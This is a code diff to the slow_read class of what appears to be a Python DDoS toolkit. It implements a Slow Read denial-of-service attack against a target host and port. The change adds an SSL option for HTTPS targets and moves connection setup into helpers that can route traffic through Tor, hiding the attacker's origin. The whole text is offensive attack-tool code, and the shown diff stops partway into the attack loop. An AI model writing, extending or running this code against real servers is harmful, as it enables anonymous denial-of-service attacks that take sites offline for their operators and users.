@@ -35,7 +35,9 @@ class slow_read(DDoS_Class):
         logs=False,
         tor=False,
         duration=60,
+        ssl_on=False,
     ):
+        self.ssl_on=ssl_on
         self.counter = 0
         self.cookie = cookie
         self.user_agents = user_agents
@@ -73,14 +75,12 @@ class slow_read(DDoS_Class):
                 if self.stop == True:
                     break
                 try:
-                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-                    if self.tor == False:
-                        s.settimeout(self.timeout)
-                    if self.tor == True:
-                        s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
-                    s.connect((self.target, self.port))
-                    if (self.port == 443) or (self.port == 8443):
-                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+                    if self.tor==True:
+                        s=get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
+                    else:
+                        s=get_socket_connection(self.target,self.port,timeout=self.timeout)
+                    if self.port==443 or self.ssl_on==True:
+                        s=wrap_socket_with_ssl(s,self.target)
                     while True:
                         if (
                             int(time.time() - self.start) >= self.duration
